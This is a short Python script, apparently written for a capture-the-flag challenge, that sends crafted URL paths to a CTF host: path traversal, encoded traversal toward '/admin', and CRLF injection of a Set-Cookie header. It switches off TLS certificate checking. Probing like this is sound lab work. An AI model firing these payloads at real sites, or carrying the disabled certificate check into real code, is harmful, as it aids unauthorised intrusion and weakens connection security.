import urllib.request
import urllib.error
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

for test_path in [
    '/test%20space',
    '/test%3Cfoo%3E',
    '/test/../login',
    '/test%2f..%2fadmin',
    '/test%0d%0aSet-Cookie:test=1',
    '/test#hash'
]:
    url = 'https://65b68ef3c79fb356.chal.ctf.ae' + test_path
    try:
        with urllib.request.urlopen(url, context=ctx, timeout=5) as resp:
            print(f"{test_path} -> Status {resp.status}")
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='ignore')
        match = [l.strip() for l in body.splitlines() if 'record of' in l]
        print(f"{test_path} -> Status {e.code}: {match}")
    except Exception as e:
        print(f"{test_path} -> Error {e}")
